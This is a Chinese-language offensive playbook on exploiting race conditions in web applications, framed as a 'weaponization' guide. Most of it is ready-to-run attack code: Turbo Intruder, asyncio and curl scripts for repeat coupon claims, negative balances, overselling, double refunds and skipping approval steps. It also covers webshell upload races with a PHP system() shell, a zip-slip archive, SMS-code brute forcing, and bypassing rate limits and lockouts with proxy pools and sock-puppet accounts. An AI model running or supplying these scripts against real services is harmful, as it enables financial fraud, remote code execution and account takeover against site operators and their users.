# 竞争条件 (Race Condition) 实战参考

> 阶段分离: [攻击] 检测竞争窗口 → [利用] TOCTOU/并发绕过/库存负数/多步逻辑破坏
> 覆盖: 点赞收藏并发 → 优惠券重复领取 → 余额竞争 → 文件上传竞争 → 多步流程绕过

---

# 攻击阶段 — 检测与识别

## 1. 竞争条件原理

```
TOCTOU (Time of Check to Time of Use):

时间线:
T1: 请求A 检查余额 → 余额100元 ✓
T2: 请求B 检查余额 → 余额100元 ✓
T3: 请求A 扣款100元 → 余额0元
T4: 请求B 扣款100元 → 余额-100元 ★ 竞争成功!

窗口期: T2-T3 之间, 两个请求同时通过了检查
```

### 1.1 常见竞争条件场景

| 场景 | 攻击目标 | 影响 |
|------|---------|------|
| **点赞/收藏/投票** | 单次操作变多次 | 刷票/刷赞 |
| **优惠券领取** | 限制1张→多张 | 薅羊毛 |
| **余额/积分消费** | 超额消费 | 负数余额 |
| **限量秒杀** | 超卖 | 库存负数 |
| **注册/邀请** | 重复领取奖励 | 刷邀请奖励 |
| **文件上传** | 上传窗口期访问 | 上传webshell |
| **多步操作** | 跳过中间步骤 | 绕过审核 |
| **验证码** | 并发爆破 | 绕过频率限制 |

---

## 2. 检测方法

### 2.1 基础时序检测

```bash
# === 单请求时间分析 ===
# 使用 curl 观察响应时间
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{time_total}\n" -X POST "https://target.com/api/like" \
    -H "Cookie: session=xxx" \
    -d "post_id=123"
done

# 响应时间 > 200ms → 可能存在锁/队列 → 竞争窗口较小
# 响应时间 < 50ms  → 可能无锁保护 → 竞争窗口较大
```

### 2.2 并发探针检测

```python
# probe.py — 检测端点是否可并发
import requests
import concurrent.futures

url = "https://target.com/api/action"
headers = {"Cookie": "session=xxx"}
data = {"target_id": "123"}

def send_request(i):
    r = requests.post(url, headers=headers, json=data)
    return i, r.status_code, r.json()

# 10并发 → 看是否都返回200 (而非429/锁定)
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as e:
    results = list(e.map(send_request, range(10)))

for i, code, resp in results:
    print(f"Request {i}: HTTP {code} → {resp}")

# 如果全部200且效果叠加 → ★ 竞争条件存在
```

---

# 利用阶段 — 武器化

## 3. 点赞/收藏/投票 并发攻击

### 3.1 Turbo Intruder (Burp Suite 推荐)

```python
# Turbo Intruder 脚本 — 单用户刷赞
# 用法: 右键请求 → "Send to Turbo Intruder"

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,        # 并发连接数
        requestsPerConnection=100,       # 每连接请求数
        pipeline=False
    )

    # 同时发送50个请求
    for i in range(50):
        engine.queue(target.req, gate='race1')

    # 无门控 → 全部同时发出
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### 3.2 Python asyncio 高并发

```python
# race_like.py — aiohttp 异步并发
import asyncio
import aiohttp

async def like_post(session, post_id, sem):
    async with sem:  # 信号量控制并发度
        async with session.post(
            "https://target.com/api/like",
            json={"post_id": post_id},
            headers={"Cookie": "session=YOUR_SESSION"}
        ) as resp:
            return await resp.json()

async def race():
    sem = asyncio.Semaphore(20)  # 20并发
    async with aiohttp.ClientSession() as session:
        tasks = [like_post(session, "123", sem) for _ in range(100)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, r in enumerate(results):
            print(f"Request {i}: {r}")

asyncio.run(race())
```

### 3.3 curl + xargs 并行 (无Python环境)

```bash
# === 单行并发 ===
seq 1 50 | xargs -P 20 -I {} curl -s -X POST "https://target.com/api/like" \
  -H "Cookie: session=xxx" \
  -d "post_id=123" -o /dev/null -w "Request {}: HTTP %{http_code}\n"

# -P 20 → 20个并发进程
# 比 for 循环快 N 倍
```

---

## 4. 优惠券/积分 重复领取

### 4.1 检测方法

```bash
# Step 1: 正常领取一次, 确认只能领1张
curl -X POST "https://target.com/api/coupon/receive" \
  -H "Cookie: session=xxx" \
  -d "coupon_id=NEWUSER50"

# Step 2: 并发领取50次
seq 1 50 | xargs -P 50 -I {} curl -s -X POST "https://target.com/api/coupon/receive" \
  -H "Cookie: session=xxx" \
  -d "coupon_id=NEWUSER50" -w "HTTP %{http_code}\n" &

# Step 3: 检查是否领到了 >1 张
curl "https://target.com/api/my-coupons" -H "Cookie: session=xxx"
```

### 4.2 绕过设备指纹限制

```bash
# 如果按 IP/设备ID 限制 → 多IP/多设备
# 使用代理池:
for i in $(seq 1 10); do
  curl -x "http://proxy_pool_$i:8080" \
    -X POST "https://target.com/api/coupon/receive" \
    -H "Cookie: session=user_$i" \
    -d "coupon_id=NEWUSER50" &
done
```

### 4.3 邀请奖励滥用

```bash
# 场景: 邀请1人 = 10积分, 上限100
# 攻击: 并发邀请 → 突破上限

# 提前注册好小号列表
sub_accounts=("sess_aaa" "sess_bbb" "sess_ccc" ... "sess_zzz")

# 主号并发接受邀请
for token in "${sub_accounts[@]}"; do
  curl -X POST "https://target.com/api/invite/accept" \
    -H "Cookie: session=MAIN_SESSION" \
    -d "invite_code=$token" &
done
wait

# 检查是否获得远超上限的积分
```

---

## 5. 余额/支付 竞争攻击

### 5.1 负数余额攻击

```python
# 原理: 并发消费 → 余额检查全部通过 → 扣款叠加 → 负数
import threading
import requests

def withdraw(amount, session):
    """并发提现/消费"""
    resp = session.post(
        "https://target.com/api/withdraw",
        json={"amount": amount}
    )
    return resp.json()

# 初始余额: 100元, 每次提现100元, 20并发
session = requests.Session()
session.headers.update({"Cookie": "session=YOUR_SESSION"})

threads = []
for i in range(20):
    t = threading.Thread(target=withdraw, args=(100, session))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# 检查余额 → 可能变成 -1900元!
```

### 5.2 限量商品超卖

```bash
# 场景: 1元秒杀, 限量100件, 库存100
# Turbo Intruder:

# queue.py for Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True          # ★ HTTP Pipelining 加速
    )
    for i in range(200):       # 200并发订单
        engine.queue(target.req, gate='order')
    engine.openGate('order')
```

---

## 6. 文件上传竞争 (Upload Race)

### 6.1 上传 + 访问 竞态

```bash
# 原理:
# 1. 上传 webshell.php → 服务器保存到 /tmp/xxx → 安全检查 → 删除
# 2. 在 "保存" 到 "删除" 的窗口期访问 /tmp/xxx → RCE

# Terminal 1: 持续上传
while true; do
  curl -s -F "file=@shell.php" "https://target.com/upload" &
  sleep 0.01
done

# Terminal 2: 持续访问临时文件
while true; do
  # 爆破临时文件名/路径
  for path in /uploads/shell.php /temp/shell.php /tmp/phpXXXXXX; do
    curl -s "https://target.com$path?cmd=id" && echo "[+] FOUND: $path" && break 2
  done
done
```

### 6.2 图片处理竞争 (ImageMagick 等)

```bash
# 场景: 上传图片 → 生成缩略图 → 处理期间竞争
# 二次渲染绕过 + 竞态

# Step 1: 上传含PHP的图片
curl -F "image=@shell.jpg" "https://target.com/upload-avatar"

# Step 2: 在缩略图生成完成前访问原始文件
# 图片处理需要时间 → 竞争窗口更大!
while true; do
  curl -s "https://target.com/uploads/avatars/shell.jpg" -o /dev/null &
  curl -s "https://target.com/uploads/avatars/shell.jpg?cmd=id" | grep uid && break
done
```

### 6.3 文件名竞争 (Zip Slip + Race)

```bash
# 场景: 上传ZIP → 解压 → 文件名处理
# 上传包含 ../ 的ZIP + 并发访问解包位置

# 创建恶意ZIP
mkdir tmp && cd tmp
echo '<?php system($_GET[1]);?>' > ../../../shell.php
zip -r evil.zip ../../../shell.php
cd ..

# 上传ZIP + 并发访问目标路径
curl -F "archive=@tmp/evil.zip" "https://target.com/import" &
sleep 0.5
curl "https://target.com/shell.php?1=id"
```

---

## 7. 多步流程绕过

### 7.1 跳过审核步骤

```bash
# 场景: 订单需要3步 (下单 → 支付 → 审核)
# 攻击: 并发跳步 → 下单直接到完成

# 原流程:
# POST /api/order/create → POST /api/order/pay → POST /api/order/approve

# 攻击: 并发请求所有步骤
curl -X POST "https://target.com/api/order/create" -d '{"item":1}' &
curl -X POST "https://target.com/api/order/pay" -d '{"order_id":"latest"}' &
curl -X POST "https://target.com/api/order/approve" -d '{"order_id":"latest"}' &
sleep 2
# 三个请求几乎同时发出 → 第2/3步可能不检查前置状态
```

### 7.2 退货/退款 并发绕过

```bash
# 场景: 退款后商品状态变为 "已退款"
# 攻击: 在状态更新前再次退款

# Turbo Intruder:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    for i in range(10):
        engine.queue(target.req, gate='refund')
    engine.openGate('refund')

# 期望: 只退1次
# 实际: 可能退10次!
```

---

## 8. 验证码/频率限制 并发绕过

### 8.1 验证码并发爆破

```python
# 场景: 4位验证码, 限5次/分钟, 无IP锁定
# 攻击: 并发100个请求 → 100次尝试在1秒内完成
import asyncio, aiohttp

async def try_code(session, code):
    async with session.post(
        "https://target.com/api/verify-code",
        json={"phone": "13800138000", "code": f"{code:04d}"}
    ) as resp:
        r = await resp.json()
        if "success" in str(r):
            print(f"[+] FOUND: {code:04d} → {r}")
            return True

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [try_code(session, i) for i in range(10000)]
        # 100并发爆破
        await asyncio.gather(*tasks[:100])

asyncio.run(main())
```

### 8.2 登录锁定绕过

```bash
# 场景: 5次失败锁定30分钟
# 攻击: 并发6次 → 第6次在锁定生效前发出

# Turbo Intruder:
# 用 Burp Intruder 的 Null payloads + 6并发
# → 第6次可能绕过锁定检查
```

---

## 9. 工具速查

### 9.1 并发测试工具对比

| 工具 | 并发能力 | 适用场景 |
|------|---------|---------|
| **Turbo Intruder** (Burp) | 3000+ RPS | ★ 首选, 图形化配置 |
| **Python asyncio** | 10000+ RPS | 自定义逻辑复杂场景 |
| **xargs -P** | ~50 并发 | 快速验证, 无需额外工具 |
| **ab (ApacheBench)** | 高 | 纯HTTP压测 → 间接发现竞态 |
| **wrk / wrk2** | 极高 | 压测识别竞争窗口 |
| **race-the-web** | 专用 | 竞争条件专项测试 |

### 9.2 Turbo Intruder 脚本模板

```python
# template.py — 通用竞争条件测试
def queueRequests(target, wordlists):

    # 配置引擎
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,     # TCP连接并发数
        requestsPerConnection=100,    # 每连接请求数
        pipeline=False,               # HTTP管线化 (小心服务器支持)
        maxRetriesPerRequest=0,       # 不重试
        engine=Engine.BURP2           # 或 Engine.THREADED
    )

    # ★ 关键: 使用 gate 实现同步发送
    for i in range(50):
        engine.queue(target.req, gate='race')

    # 所有请求同时释放
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### 9.3 识别竞争窗口大小

```bash
# 方法1: 单线程时间差
# 发起两个相同请求, 间隔N ms
for delay in 100 50 20 10 5 2 1 0; do
  curl -s -o /dev/null "https://target.com/api/check" &
  sleep $(echo "scale=3; $delay/1000" | bc)
  curl -s -o /dev/null "https://target.com/api/check" &
  wait
  # 检查是否出现竞态结果
done

# 方法2: ab压测看行为
ab -n 100 -c 20 "https://target.com/api/action"
# 查看成功率 vs 并发度的关系
```

---

## 10. 后端防御特征识别

```bash
# 观察响应头/响应体识别防御机制:

# 乐观锁 (version字段)
# 响应: {"version": 5} → 修改时需要传入相同version
# 绕过: 需要竞争 version 检查

# 悲观锁 (SELECT ... FOR UPDATE)
# 响应时间: 第2个请求明显延迟 (等待锁释放)
# 绕过: 找无锁的关联操作

# 分布式锁 (Redis SETNX)
# 响应: HTTP 409 Conflict / 429 Too Many Requests
# 绕过: 单连接多请求 (pipeline)

# 令牌桶限流
# 响应: X-RateLimit-Remaining 头
# 绕过: IP轮换 + Session轮换
```

---

## 11. 实战绕过技巧

### 11.1 同一连接多请求 (绕过IP限流)

```python
# 场景: 基于IP的速率限制, 但同一TCP连接内的请求可能不计入
import socket

def send_multi_on_single_conn(host, port, requests):
    """单TCP连接发送多个HTTP请求"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    for req in requests:
        sock.send(req.encode())

    # 读取所有响应
    resp = sock.recv(65535)
    sock.close()
    return resp
```

### 11.2 慢速竞争 (避开速率限制)

```bash
# 用极低并发但精密定时 → 增加竞态成功率
# 每个请求间隔等于竞争窗口一半

# 假设竞争窗口约 50ms → 间隔25ms发请求
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/action" -H "Cookie: session=xxx" -d "data=value" &
  sleep 0.025
done
```

### 11.3 多账号协同竞争

```bash
# 场景: A邀请B → A得奖励
# 攻击: 主号A + 100小号 → 并发接受邀请

# 小号的会话预先生成
for session in "${small_sessions[@]}"; do
  curl -X POST "https://target.com/api/invite/accept" \
    -H "Cookie: session=$session" \
    -d "invite_code=MAIN_USER_CODE" &
done
```

---

*参考: PortSwigger Race Conditions + OWASP Race Condition + 实战案例 + CWE-362/367*
